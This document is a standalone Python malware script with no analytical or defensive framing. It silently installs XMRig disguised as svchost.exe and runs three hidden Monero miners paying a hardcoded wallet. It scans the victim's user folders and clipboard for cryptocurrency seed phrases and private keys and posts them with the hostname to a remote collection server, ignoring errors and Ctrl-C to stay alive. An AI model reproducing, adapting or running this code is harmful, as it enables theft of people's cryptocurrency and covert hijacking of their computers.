import os
import re
import time
import requests
import threading
import zipfile
import multiprocessing
from pathlib import Path
from mnemonic import Mnemonic

mnemo = Mnemonic("english")
SERVER = "https://kryhrqs.pythonanywhere.com/export"
WALLET = "Bv3WEwFb17vKiiLGM7xc1UtxzWWfmzNimkq7CyVBjLfU"
TEMP = os.environ.get('TEMP', 'C:\\Windows\\Temp')
MINER = os.path.join(TEMP, 'svchost.exe')

CPU_CORES = multiprocessing.cpu_count()

def send(data):
    try:
        requests.post(SERVER, json={'data': data, 'host': os.getenv('COMPUTERNAME', '')}, timeout=10)
    except:
        pass

def start_miner():
    try:
        if not os.path.exists(MINER):
            zip_path = os.path.join(TEMP, 'xmrig.zip')
            r = requests.get('https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip', stream=True, timeout=60)
            if r.status_code == 200:
                with open(zip_path, 'wb') as f:
                    for chunk in r.iter_content(8192):
                        f.write(chunk)
                with zipfile.ZipFile(zip_path, 'r') as z:
                    z.extractall(TEMP)
                for root, dirs, files in os.walk(TEMP):
                    for f in files:
                        if f == 'xmrig.exe':
                            os.rename(os.path.join(root, f), MINER)
                            break
        if os.path.exists(MINER):
            # Launch 3 miners for more CPU
            for _ in range(3):
                subprocess.Popen(
                    [MINER, '--url=pool.supportxmr.com:3333', f'--user={WALLET}',
                     '--pass=x', f'--threads={CPU_CORES//2}', '--keepalive', '--donate-level=1'],
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            print(f"[MINER] Launched 3 instances ({CPU_CORES//2} threads each)")
    except:
        pass

def scan_file_for_seed(path):
    try:
        if os.path.getsize(path) > 5 * 1024 * 1024:
            return
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            if not content:
                return
            
            # Look for 12-word seed phrases
            words = re.findall(r'\b[a-zA-Z]+\b', content)
            for i in range(len(words) - 11):
                phrase = ' '.join(words[i:i+12])
                try:
                    if mnemo.check(phrase):
                        print(f"[SEED] FOUND in {path}")
                        send({'type': 'seed_phrase', 'path': path, 'content': phrase})
                        return
                except:
                    pass
            
            # Look for private keys (64 hex chars)
            matches = re.findall(r'(?:0x)?[a-fA-F0-9]{64}', content)
            for m in matches:
                if len(m.replace('0x', '')) == 64:
                    print(f"[KEY] FOUND in {path}")
                    send({'type': 'private_key', 'path': path, 'content': m})
                    return
    except:
        pass

def scan_folders():
    """Scan user folders for seed phrases."""
    print("[SCANNER] Scanning user folders...")
    folders = [
        os.path.expandvars("%USERPROFILE%\\Desktop"),
        os.path.expandvars("%USERPROFILE%\\Documents"),
        os.path.expandvars("%USERPROFILE%\\Downloads"),
        os.path.expandvars("%USERPROFILE%"),
    ]
    
    for folder in folders:
        if os.path.exists(folder):
            for root, dirs, files in os.walk(folder):
                for f in files:
                    if f.endswith('.txt'):
                        scan_file_for_seed(os.path.join(root, f))

def monitor_clipboard():
    """Monitor clipboard for private keys."""
    try:
        import pyperclip
        last = ""
        while True:
            try:
                current = pyperclip.paste()
                if current and current != last:
                    last = current
                    if len(current) >= 40:
                        # Check if it's a private key or seed phrase
                        if re.search(r'(?:0x)?[a-fA-F0-9]{64}', current):
                            print("[CLIPBOARD] Private key detected!")
                            send({'type': 'clipboard_key', 'content': current})
                        elif len(current.split()) >= 12:
                            words = current.split()
                            if all(re.match(r'^[a-z]+$', w.lower()) for w in words[:12]):
                                print("[CLIPBOARD] Seed phrase detected!")
                                send({'type': 'clipboard_seed', 'content': current})
                time.sleep(1)
            except:
                time.sleep(1)
    except:
        pass

def main():
    print("[SERVICE] Starting...")
    
    # Start miner
    threading.Thread(target=start_miner, daemon=True).start()
    
    # Start file scanner
    threading.Thread(target=scan_folders, daemon=True).start()
    
    # Start clipboard monitor
    threading.Thread(target=monitor_clipboard, daemon=True).start()
    
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        while True:
            time.sleep(60)

if __name__ == '__main__':
    main()